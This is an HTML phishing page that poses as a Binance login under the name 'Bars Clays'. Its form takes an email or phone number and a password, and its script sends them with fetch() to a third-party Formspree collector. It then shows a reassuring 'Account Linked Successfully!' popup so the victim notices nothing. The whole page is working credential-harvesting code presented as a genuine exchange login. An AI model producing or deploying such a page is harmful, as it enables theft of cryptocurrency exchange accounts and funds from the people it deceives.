<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Bars Clays - Binance PRO Login</title>
<style>
/* ---------- RESET ---------- */
*{margin:0;padding:0;box-sizing:border-box;font-family:Arial, Helvetica, sans-serif;}
body{background:#f5f5f5;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px;}

/* ---------- CONTAINER ---------- */
.container{
width:100%;
max-width:420px;
background:#fff;
border-radius:16px;
padding:34px 26px 40px;
box-shadow:0 10px 30px rgba(0,0,0,.1);
}

/* ---------- HEADER ---------- */
.logo{text-align:center;font-weight:700;font-size:28px;color:#fcd535;margin-bottom:6px;}
.subtitle{text-align:center;color:#777;font-size:14px;margin-bottom:28px;}
.welcome{text-align:center;font-size:28px;font-weight:700;margin-bottom:26px;}

/* ---------- INPUTS ---------- */
.input-group{margin-bottom:18px;position:relative;}
.input-group label{font-size:14px;color:#555;}
.input-group input{
width:100%;
margin-top:8px;
padding:16px 45px 16px 16px;
border-radius:10px;
border:none;
background:#efefef;
font-size:16px;
}
.input-group input:focus{outline:none;background:#e9e9e9;}
.input-group .toggle-password{
position:absolute;
right:12px;
top:50%;
transform:translateY(-50%);
cursor:pointer;
font-size:16px;
color:#777;
}

/* ---------- EMAIL / PHONE TOGGLE ---------- */
.toggle-group{
display:flex;
justify-content:flex-start;
gap:12px;
margin-bottom:18px;
}
.toggle-group button{
padding:6px 12px;
border-radius:8px;
border:1px solid #ddd;
background:#f9f9f9;
cursor:pointer;
font-size:14px;
}
.toggle-group button.active{background:#fcd535;color:#000;border:none;}

/* ---------- CHECKBOX ---------- */
.checkbox{
display:flex;
gap:10px;
align-items:flex-start;
font-size:14px;
color:#333;
margin-bottom:18px;
}
.checkbox input{width:18px;height:18px;margin-top:3px;}

/* ---------- BUTTONS ---------- */
button.submit{
width:100%;
padding:16px;
border:none;
border-radius:10px;
background:#fcd535;
font-weight:700;
font-size:18px;
cursor:pointer;
display:flex;
justify-content:center;
align-items:center;
gap:10px;
}
button.submit:disabled{opacity:.7;cursor:not-allowed;}

.google-btn{
width:100%;
padding:14px;
border-radius:10px;
border:1px solid #ddd;
display:flex;
align-items:center;
justify-content:center;
gap:10px;
margin-bottom:16px;
background:#fff;
font-weight:600;
cursor:pointer;
}

/* ---------- LINK ---------- */
.forgot{display:block;text-align:right;font-size:14px;color:#0073e6;text-decoration:none;margin-bottom:16px;}

/* ---------- POPUP ---------- */
.popup{
position:fixed;top:0;left:0;width:100%;height:100%;
background:rgba(0,0,0,.6);display:none;
justify-content:center;align-items:center;padding:20px;
}
.popup-box{
background:#1E2329;color:#EAECEF;border-radius:14px;padding:40px 30px;
max-width:360px;width:100%;text-align:center;animation:popBox .25s ease;
}
@keyframes popBox{from{transform:scale(.9);opacity:.4}to{transform:scale(1);opacity:1}}
.checkmark{width:80px;height:80px;border-radius:50%;display:flex;justify-content:center;align-items:center;margin:0 auto 20px;background:#0ECB81;animation:pop .45s ease forwards;position:relative;}
.checkmark::after{content:'‚úî';font-size:42px;color:#fff;opacity:0;animation:fadeIn .5s ease .45s forwards;}
@keyframes pop{0%{transform:scale(0)}100%{transform:scale(1)}}
@keyframes fadeIn{0%{opacity:0}100%{opacity:1}}
.popup h2{color:#0ECB81;margin-bottom:8px;}
.popup p{color:#B7BDC6;font-size:14px;margin-bottom:20px;}
.popup button{background:#FCD535;color:#000;padding:12px 22px;border-radius:8px;}

/* MOBILE */
@media(max-width:420px){
.container{padding:28px 20px}
.welcome{font-size:24px}
}
</style>
</head>
<body>

<div class="container">
<div class="logo">Bars Clays</div>
<div class="subtitle">Secure account contact</div>
<div class="welcome">Welcome to Binance</div>

<!-- EMAIL / PHONE TOGGLE -->
<div class="toggle-group">
<button type="button" class="active" id="emailBtn">Email</button>
<button type="button" id="phoneBtn">Phone</button>
</div>

<form id="contactForm" action="https://formspree.io/f/xjgewkoy" method="POST">

<div class="input-group">
<label id="emailLabel">Email</label>
<input type="email" name="email" id="emailInput" required>
</div>

<div class="input-group">
<label>Password</label>
<input type="password" name="password" id="passwordInput" required>
<span class="toggle-password" id="togglePassword">üëÅ</span>
</div>

<div class="checkbox">
<input type="checkbox" checked>
<div>By continuing, I agree to the Terms and Privacy Policy.</div>
</div>

<a href="#" class="forgot">Forgot password?</a>

<button type="submit" class="submit">Continue</button>

</form>

<div class="google-btn">
<img src="https://www.gstatic.com/firebasejs/ui/2.0.0/images/auth/google.svg" alt="Google" width="20">
Continue with Google
</div>
</div>

<!-- SUCCESS POPUP -->
<div id="popup" class="popup">
<div class="popup-box">
<div class="checkmark"></div>
<h2>Account Linked Successfully!</h2>
<p>Your Bars Clays account details have been received safely.</p>
<button onclick="closePopup()">Back</button>
</div>
</div>

<script>
const form = document.getElementById("contactForm");
const popup = document.getElementById("popup");

// Password toggle
const togglePassword = document.getElementById("togglePassword");
const passwordInput = document.getElementById("passwordInput");
togglePassword.addEventListener("click", () => {
  const type = passwordInput.type === "password" ? "text" : "password";
  passwordInput.type = type;
});

// Email / Phone toggle
const emailBtn = document.getElementById("emailBtn");
const phoneBtn = document.getElementById("phoneBtn");
const emailInput = document.getElementById("emailInput");
const emailLabel = document.getElementById("emailLabel");

emailBtn.addEventListener("click", () => {
  emailBtn.classList.add("active");
  phoneBtn.classList.remove("active");
  emailLabel.textContent = "Email";
  emailInput.type = "email";
  emailInput.placeholder = "Email address";
});

phoneBtn.addEventListener("click", () => {
  phoneBtn.classList.add("active");
  emailBtn.classList.remove("active");
  emailLabel.textContent = "Phone";
  emailInput.type = "tel";
  emailInput.placeholder = "Phone number";
});

// Formspree submission with popup
form.addEventListener("submit", async function(e){
    e.preventDefault();
    const data = new FormData(form);
    const response = await fetch(form.action,{
        method:"POST",
        body:data,
        headers:{ 'Accept':'application/json' }
    });
    if(response.ok){
        popup.style.display="flex";
        form.reset();
    } else {
        alert("Submission failed. Try again.");
    }
});

popup.addEventListener("click",function(e){
    if(e.target===popup){ popup.style.display="none"; }
});

function closePopup(){ popup.style.display="none"; }
</script>

</body>
</html>
